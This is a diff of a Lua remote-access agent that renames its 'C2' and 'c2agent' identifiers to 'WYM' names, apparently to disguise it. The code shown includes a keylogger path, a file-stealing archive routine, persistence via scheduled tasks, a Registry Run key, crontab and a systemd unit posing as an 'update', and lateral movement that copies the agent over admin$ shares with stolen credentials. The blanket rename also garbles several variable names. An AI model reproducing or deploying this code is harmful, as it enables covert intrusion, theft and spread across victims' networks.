@@ -11,14 +11,14 @@
 --                 --interval 5 --jitter 2 --verbose
 --
 -- Environment variables (accepted when the flag is not given):
---   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+--   WYM_SERVER, WYM_TOKEN, WYM_INTERVAL, WYM_JITTER, WYM_STATE_FILE, WYM_VERBOSE
 --
 -- Flags:
---   --server URL      server base URL (required unless C2_SERVER is set)
---   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+--   --server URL      server base URL (required unless WYM_SERVER is set)
+--   --token TOKEN     shared agent token (required unless WYM_TOKEN is set)
 --   --interval N      heartbeat interval in seconds (default 10, min 1)
 --   --jitter N        random jitter in seconds added to the interval
---   --state FILE      state file persisting the agent id (default ~/.c2agent.json)
+--   --state FILE      state file persisting the agent id (default ~/.wymagent.json)
 --   --verbose         print activity to stdout
 --   -h, --help        show this help and exit
 --
@@ -158,7 +158,7 @@ end
 
 local SHELL_TIMEOUT = 120
 local OUTPUT_LIMIT  = 12000
-local STATE_FILE = (os.getenv("HOME") or os.getenv("USERPROFILE") or ".") .. "/.c2agent.json"
+local STATE_FILE = (os.getenv("HOME") or os.getenv("USERPROFILE") or ".") .. "/.wymagent.json"
 
 -- ---------------------------------------------------------------- globals
 
@@ -223,7 +223,7 @@ end
 local _tmp_n = 0
 local function mktmp()
     _tmp_n = _tmp_n + 1
-    local name = "c2tmp" .. os.time() .. "_" .. _tmp_n
+    local name = "wymtmp" .. os.time() .. "_" .. _tmp_n
     if IS_WIN then
         return (os.getenv("TEMP") or os.getenv("TMP") or ".") .. "\\" .. name
     end
@@ -580,7 +580,7 @@ end
 local function klog_base()
     local sep = package.config:sub(1, 1)
     local dir = (sep == "\\" and os.getenv("TEMP")) or "/tmp"
-    return dir .. "/.c2keylog_" .. agent_id
+    return dir .. "/.wymkeylog_" .. agent_id
 end
 
 local function proc_alive(pid)
@@ -1083,7 +1083,7 @@ local function task_steal(task_id, args)
     -- Create archive: try zip/tar (unix) or tar/Compress-Archive (windows)
     local archive = work .. "/steal.zip"
     local ar_err = {}
-    local rc1, rc2, rc3
+    local rc1, rwym, rc3
     if IS_WIN then
         rc1 = os.execute(string.format(
             'tar -a -cf "%s" -C "%s" --exclude=steal.* . >NUL 2>"%s\\archive.err"',
@@ -1096,10 +1096,10 @@ local function task_steal(task_id, args)
     end
     local f = io.open(archive, "rb")
     if not f and IS_WIN then
-        rc2 = os.execute(string.format(
+        rwym = os.execute(string.format(
             "powershell -NoProfile -Command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\" 2>\"%s\\archive.err\"",
             work, archive, work))
-        ar_err[#ar_err + 1] = "psca rc=" .. tostring(rc2)
+        ar_err[#ar_err + 1] = "psca rc=" .. tostring(rwym)
         f = io.open(archive, "rb")
     end
     if not f then
@@ -1178,12 +1178,12 @@ local function task_persistence(args)
     local destdir, dest
     if IS_WIN then
         destdir = (os.getenv("APPDATA") or os.getenv("USERPROFILE") or ".")
-            .. "\\Microsoft\\Windows\\c2update"
-        dest = destdir .. "\\c2agent.lua"
+            .. "\\Microsoft\\Windows\\wymupdate"
+        dest = destdir .. "\\wymagent.lua"
     else
         local home = os.getenv("HOME") or "."
-        destdir = home .. "/.config/c2update"
-        dest = destdir .. "/" .. (self:match("([^/\\]+)$") or "c2agent.lua")
+        destdir = home .. "/.config/wymupdate"
+        dest = destdir .. "/" .. (self:match("([^/\\]+)$") or "wymagent.lua")
     end
     mkdirp(destdir)
     if IS_WIN then
@@ -1197,9 +1197,9 @@ local function task_persistence(args)
     local detail = ""
     if IS_WIN then
         local progdata = os.getenv("ProgramData") or os.getenv("ALLUSERSPROFILE") or "C:\\ProgramData"
-        local wrapper_dir = progdata .. "\\c2update"
+        local wrapper_dir = progdata .. "\\wymupdate"
         mkdirp(wrapper_dir)
-        local wrapper = wrapper_dir .. "\\c2relaunch.cmd"
+        local wrapper = wrapper_dir .. "\\wymrelaunch.cmd"
         local wf = io.open(wrapper, "wb")
         if not wf then
             return "persistence error: could not write launcher " .. wrapper, 1
@@ -1208,36 +1208,36 @@ local function task_persistence(args)
         wf:close()
         detail = "persistence: wrote launcher " .. wrapper
         local r1, _, c1 = os.execute(string.format(
-            'schtasks /Create /TN "c2agent-persist" /TR "%s" /SC ONLOGON /RL HIGHEST /F >NUL 2>&1', wrapper))
+            'schtasks /Create /TN "wymagent-persist" /TR "%s" /SC ONLOGON /RL HIGHEST /F >NUL 2>&1', wrapper))
         if r1 == true and c1 == 0 then
             ok = true
-            detail = detail .. "\nschtasks: scheduled ONLOGON (c2agent-persist)"
+            detail = detail .. "\nschtasks: scheduled ONLOGON (wymagent-persist)"
         else
-            local r2, _, c2 = os.execute(string.format(
-                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v c2agent /t REG_SZ /d "%s" /f >NUL 2>&1', wrapper))
-            if r2 == true and c2 == 0 then
+            local r2, _, wym = os.execute(string.format(
+                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v wymagent /t REG_SZ /d "%s" /f >NUL 2>&1', wrapper))
+            if r2 == true and wym == 0 then
                 ok = true
-                detail = detail .. "\nreg: HKCU Run key set (c2agent)"
+                detail = detail .. "\nreg: HKCU Run key set (wymagent)"
             end
         end
     else
         local cronout = shell_capture(string.format(
-            "(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo '@reboot %s # c2agent-persist') | crontab - 2>&1", cmd))
+            "(crontab -l 2>/dev/null | grep -v 'wymagent-persist'; echo '@reboot %s # wymagent-persist') | crontab - 2>&1", cmd))
         local cr_ok = (cronout:gsub("%s+", "") == "")
         if cr_ok then
-            detail = "crontab: @reboot hook installed (c2agent-persist)"
+            detail = "crontab: @reboot hook installed (wymagent-persist)"
         else
             detail = "crontab: " .. cronout:gsub("%s+", " ")
         end
-        local unit = destdir .. "/c2-update.service"
+        local unit = destdir .. "/wym-update.service"
         local uf = io.open(unit, "w")
         if uf then
             uf:write(string.format(
-                "[Unit]\nDescription=c2 update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c \"%s\"\nRestart=always\n\n[Install]\nWantedBy=default.target\n", cmd))
+                "[Unit]\nDescription=wym update\n\n[Service]\nType=simple\nExecStart=/bin/sh -c \"%s\"\nRestart=always\n\n[Install]\nWantedBy=default.target\n", cmd))
             uf:close()
         end
         local sctlmark = shell_capture(
-            "systemctl --user daemon-reload >/dev/null 2>&1; if systemctl --user enable --now c2-update.service >/dev/null 2>&1; then echo __OK__; else echo __FAIL__; fi")
+            "systemctl --user daemon-reload >/dev/null 2>&1; if systemctl --user enable --now wym-update.service >/dev/null 2>&1; then echo __OK__; else echo __FAIL__; fi")
         local sys_ok = (sctlmark:find("__OK__") ~= nil)
         if not sys_ok then detail = detail .. "\nsystemctl: user unit failed" end
         ok = cr_ok or sys_ok
@@ -1254,8 +1254,8 @@ end
 
 local function task_lateral(args)
     local subnet = args.subnet or ""
-    local user = args.user or os.getenv("C2_LAT_USER") or ""
-    local pass = args.pass or os.getenv("C2_LAT_PASS") or ""
+    local user = args.user or os.getenv("WYM_LAT_USER") or ""
+    local pass = args.pass or os.getenv("WYM_LAT_PASS") or ""
     local own = local_ip()
     local base = subnet:match("^(%d+%.%d+%.%d+)") or own:match("^(%d+%.%d+%.%d+)")
     if not base then return "lateral: no LAN peers found", 1 end
@@ -1294,11 +1294,11 @@ local function task_lateral(args)
             return "failed (copy: file copy failed over admin$ share)"
         end
         local terr = shell_capture(string.format(
-            'schtasks /Create /S %s /TN "c2agent-lateral" /TR "\\\\%s\\admin$\\%s" /SC ONLOGON /RU %s /RP "%s" /RL HIGHEST /F 2>&1',
+            'schtasks /Create /S %s /TN "wymagent-lateral" /TR "\\\\%s\\admin$\\%s" /SC ONLOGON /RU %s /RP "%s" /RL HIGHEST /F 2>&1',
             host, host, bname, u, p))
         os.execute('net use "' .. share .. '" /delete /y >NUL 2>&1')
         if terr:gsub("%s+", "") == "" then
-            return "deployed (file dropped + scheduled c2agent-lateral)"
+            return "deployed (file dropped + scheduled wymagent-lateral)"
         else
             return "deployed (file dropped; task: " .. terr:gsub("%s+", " ") .. ")"
         end
@@ -1335,7 +1335,7 @@ local function task_lateral(args)
         plist[#plist + 1] = host
         local status
         if user == "" and pass == "" then
-            status = "skipped (no credentials; set C2_LAT_USER/C2_LAT_PASS)"
+            status = "skipped (no credentials; set WYM_LAT_USER/WYM_LAT_PASS)"
             skip = skip + 1
         else
             if IS_WIN then
@@ -1416,12 +1416,12 @@ while i <= #arg do
     if arg[i] == "-h" or arg[i] == "--help" then
         print("usage: lua agent.lua --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]")
         print("")
-        print("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):")
-        print("  --server URL      server base URL (required unless C2_SERVER is set)")
-        print("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)")
+        print("Flags (also settable via WYM_SERVER/WYM_TOKEN/WYM_INTERVAL/WYM_JITTER/WYM_STATE_FILE/WYM_VERBOSE):")
+        print("  --server URL      server base URL (required unless WYM_SERVER is set)")
+        print("  --token TOKEN     shared agent token (required unless WYM_TOKEN is set)")
         print("  --interval N      heartbeat interval in seconds (default 10, min 1)")
         print("  --jitter N        random jitter in seconds added to the interval")
-        print("  --state FILE      state file persisting the agent id (default ~/.c2agent.json)")
+        print("  --state FILE      state file persisting the agent id (default ~/.wymagent.json)")
         print("  --verbose         print activity to stdout")
         print("  -h, --help        show this help and exit")
         os.exit(0)
@@ -1443,23 +1443,23 @@ while i <= #arg do
 end
 
 -- Fallback to env vars
-if server == "" then server = os.getenv("C2_SERVER") or "" end
-if token == "" then token = os.getenv("C2_TOKEN") or "" end
+if server == "" then server = os.getenv("WYM_SERVER") or "" end
+if token == "" then token = os.getenv("WYM_TOKEN") or "" end
 local function not_passed(flag)
     for _, a in ipairs(arg) do if a == flag then return false end end
     return true
 end
-if not_passed("--interval") and os.getenv("C2_INTERVAL") then
-    local v = tonumber(os.getenv("C2_INTERVAL")); if v then interval = v end
+if not_passed("--interval") and os.getenv("WYM_INTERVAL") then
+    local v = tonumber(os.getenv("WYM_INTERVAL")); if v then interval = v end
 end
-if not_passed("--jitter") and os.getenv("C2_JITTER") then
-    local v = tonumber(os.getenv("C2_JITTER")); if v then jitter = v end
+if not_passed("--jitter") and os.getenv("WYM_JITTER") then
+    local v = tonumber(os.getenv("WYM_JITTER")); if v then jitter = v end
 end
-if not_passed("--state") and os.getenv("C2_STATE_FILE") then
-    STATE_FILE = os.getenv("C2_STATE_FILE")
+if not_passed("--state") and os.getenv("WYM_STATE_FILE") then
+    STATE_FILE = os.getenv("WYM_STATE_FILE")
 end
 if not_passed("--verbose")
-   and (os.getenv("C2_VERBOSE") == "1" or os.getenv("C2_VERBOSE") == "true") then
+   and (os.getenv("WYM_VERBOSE") == "1" or os.getenv("WYM_VERBOSE") == "true") then
     verbose = true
 end
 
